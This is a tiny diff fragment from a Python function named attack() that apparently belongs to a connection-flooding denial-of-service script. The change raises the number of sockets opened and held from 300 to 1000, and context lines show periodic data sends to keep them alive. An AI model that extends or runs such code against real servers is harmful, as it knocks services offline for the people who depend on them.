@@ -40,7 +40,7 @@ def attack():
         time.sleep(10)
         send_data()
 
-    for z in range(0, 300):
+    for z in range(0, 1000):
         returned_sock = create_connection()
         connections.append(returned_sock)
 
